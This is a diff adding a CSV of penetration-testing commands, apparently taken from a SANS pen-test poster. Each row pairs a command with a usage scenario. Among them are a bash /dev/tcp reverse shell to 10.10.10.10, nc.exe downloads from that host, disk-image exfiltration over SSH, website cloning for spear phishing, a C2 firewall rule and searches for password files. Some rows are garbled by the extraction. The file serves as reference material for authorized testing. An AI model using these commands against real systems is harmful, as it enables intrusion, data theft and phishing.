@@ -1,0 +1,119 @@
+Description,Usage,Command,Language,Source
+Configure a Windows machine as a WPA2-PSK Access Point.,"Usage scenario: Share a Windows machine?s Internet access with other systems wirelessly, or use a Windows machine to attract wireless clients into joining it for exploitation purposes.","netsh wlan set hostednetwork mode=allow ssid=<MYSSID>
+key=<MYPASSWORD> && netsh wlan start hostednetwork",CMD.exe,SANS-PenTest-Commands-Poster.pdf
+"Configure a TCP port forwarding relay from IPv4 to IPv6 (v4tov4, v6tov6,
+and v6tov4 also supported).","Usage scenario: Pivot a TCP connection through a Windows machine using
+built-in functionality, converting IPv4 to IPv6 as needed.","netsh interface portproxy add v4tov6 listenport=<LPORT>
+listenaddress=0.0.0.0 connectport=<RPORT> connectaddress=<RHOST>",CMD.exe,SANS-PenTest-Commands-Poster.pdf
+Get a list of TCP and UDP activity every 1 second.,"Usage scenario: Look for a connection coming in from a specific IP
+address or port to determine when the connection occurs, within 1 second.","netstat -naob 1 | find ""<IPADDR or PORT>""",CMD.exe,SANS-PenTest-Commands-Poster.pdf
+Get a list of all available attributes of all running processes.,"Usage scenario: Look through processes to determine what is running,
+including potentially exploitable software, malware, and other tools.",wmic process list full,CMD.exe,SANS-PenTest-Commands-Poster.pdf
+Get a list of services running inside of each process.,"Usage scenario: Look for running services that might be exploitable or
+running malware.",tasklist /svc,CMD.exe,SANS-PenTest-Commands-Poster.pdf
+Add a firewall rule to the built-in Windows firewall.,"Usage scenario: Allow connections into a new port for a
+listening backdoor, a service ready to deliver an exploit
+to clients, or a pivot.","New-NetFirewallRule -Action Allow
+-DisplayName Pentester-C2 -RemoteAddress
+<IPADDR>",Powershell,SANS-PenTest-Commands-Poster.pdf
+"Conduct a port scan of a target IP address, using only built-in
+features.","Usage scenario: Discover open ports on other target machines,
+using only built-in features.","1..1024 | % {echo ((new-object
+Net.Sockets.TcpClient).Connect(""<IPADDR>"",
+$_)) ""Port $_ is open!""} 2>$null ",Powershell,SANS-PenTest-Commands-Poster.pdf
+"Conduct a ping sweep of a target IP address
+space, using only built-in features.","Usage scenario: In post-exploitation,
+find additional target machines.","10.$_""; ping -n 1 -w 100
+10.10.10.$_ | Select-String ttl}",Powershell,SANS-PenTest-Commands-Poster.pdf
+On-Line Web Client Win 7,Usage: Moving files. Instantiate a web client to download a file (such as nc.exe) from a given URL.,"(New-Object
+System.Net.WebClient).DownloadFile(""http://
+10.10.10.10/nc.exe"",""c:\nc.exe"")",Powershell,SANS-PenTest-Commands-Poster.pdf
+On-Line Web Client Win 8 and later,Usage: Moving files. Instantiate a web client to download a file (such as nc.exe) from a given URL.," wget
+""http://10.10.10.10/nc.exe"" -outfile
+""c:\nc.exe"" ",Powershell,SANS-PenTest-Commands-Poster.pdf
+"Encode or decode base64
+information.","Usage scenario: Quickly determine
+the un-encoded value of base64
+strings in web applications,
+configuration files, protocol
+messages, and more.","echo 'Hello, World!' |
+base64 or echo
+'SGVsbG8sIFdvcmxkIQo=' |
+base64 -d",Powershell,SANS-PenTest-Commands-Poster.pdf
+Shows help and examples,,Get-Help [cmdlet] -example,Powershell,SANS-PenTest-Commands-Poster.pdf
+Shows a list of commands,,Get-Command,Powershell,SANS-PenTest-Commands-Poster.pdf
+Shows properties and methods,,Get-Member,Powershell,SANS-PenTest-Commands-Poster.pdf
+Takes each item on pipeline and handles it as $_,,ForEach-Object { $_ },Powershell,SANS-PenTest-Commands-Poster.pdf
+"Searches for strings in files or output, like grep",,Select-String,Powershell,SANS-PenTest-Commands-Poster.pdf
+"Search c:\PATH\TO\DIRECTORY for files that contain the
+“STRING”, displaying the file name and the line containing the
+STRING.","Usage scenario: Find password files, database connection strin
+encryption keys, and a multitude of other useful items during
+gs,
+post-exploitation.","ls -r c:\PATH\TO\DIRECTORY -file | %
+{Select-String -path $_ -pattern STRING}",Powershell,SANS-PenTest-Commands-Poster.pdf
+Clone a website to the local system.,"Usage scenario: Create a look-alike website to use for impersonation attacks, such as a site to direct victims to during spear phishing attacks.", wget -r -nH $URL or wget -mkEpnp $URL,BASH,SANS-PenTest-Commands-Poster.pdf
+"Redirect IPv6 listening TCP port to
+localhost IPv4.","Usage scenario: Pivoting a connection
+across the network via IPv6 to a local
+listening port on IPv4, allowing
+IPv4-focused TCP tools to attack
+across IPv6.","IPV6ADDR=fc00:660:0:1::46
+&& PORT=110 && socat
+TCP-LISTEN:$PORT,reuseaddr,
+fork TCP6:[$IPV6ADDR]:$PORT",BASH,SANS-PenTest-Commands-Poster.pdf
+Get the external IP address of the machine the command is run on.,"Usage scenario: After exploiting a machine, especially via client-side exploit, determine the external IP address of that machine to better understand where the machine is and how it is accessing the outside world.","dig +short
+myip.opendns.com
+@resolver1.opendns.com",BASH,SANS-PenTest-Commands-Poster.pdf
+Get the external IP address of the machine the command is run on.,"Usage scenario: After exploiting a machine, especially via client-side exploit, determine the external IP address of that machine to better understand where the machine is and how it is accessing the outside world.", wget -qO- ifconfig.me/ip,BASH,SANS-PenTest-Commands-Poster.pdf
+"Exfiltrate the contents of an
+image via SSH to another
+machine, compressing (-C) the
+content to speed up transfer.","Usage scenario: Upon exploiting a
+machine with a small file
+system or particularly
+interesting partition, move that
+partition to the pen tester’s
+machine, compressing and
+encrypting data using SSH.","dd if=/dev/rdisk0s1s2 bs=65536 conv=noerror,sync | ssh -C user@10.10.10.10 ""cat >/tmp/image.dd""",BASH,SANS-PenTest-Commands-Poster.pdf
+"Type “gah” after you forgot to use
+sudo, and it’ll sudo your most recent
+command.","Usage scenario: Day-to-day bash
+tricks to make life easier.","alias gah='sudo $(history
+-p \!\!)'",BASH,SANS-PenTest-Commands-Poster.pdf
+"Search /PATH/TO/DIRECTORY for
+files of the type “FILE-FILTER”
+(e.g., *.txt) that contain the
+“STRING”, displaying the line of the
+file with “STRING” and the file
+name.","Usage scenario: Find password files,
+database connection strings,
+encryption keys, and a multitude of
+other useful items during
+post-exploitation.","find /PATH/TO/DIRECTORY
+-name ""FILE-FILTER"" -type
+f -exec grep -i ""STRING""
+{} \; -print 2>/dev/null",,
+Cat a file using colorful output.,"Usage scenario: Review XML, code,
+or configuration files in a manner
+that is easier to read and makes
+the world a more beautiful place.","alias ccat='pygmentize
+-O bg=dark,style=colorful'",,
+"Measure whether a service is still up
+by connecting to its port every 1
+second.","Usage scenario: verify service is still
+running during exploitation."," while (true); do nc -vv
+-z -w3 10.10.10.10 80 >
+/dev/null && echo -e
+""Service is up""; sleep 1;
+done",,
+"Create a reverse shell back to a
+given IP address and port.","Usage scenario: Exploit a target
+machine (e.g., through command
+injection) and get a shell using only
+built-in features of bash."," bash -i >&
+/dev/tcp/10.10.10.10/8080
+0>&1",,
+List the firewall rules and display them in grid view or CSV.,Usage scenario: Review the Windows built-in firewall rules to look for open ports to use for attacks and pivots.,"Get-NetFirewallRule -all | Out-GridView or Get-NetFirewallRule | Export-CSV <file_path.csv>
+Get-NetFirewallRule -all | Export-csv <file_path.csv>",BASH,SANS-PenTest-Commands-Poster.pdf
+http://icanhazip.com/,,,,
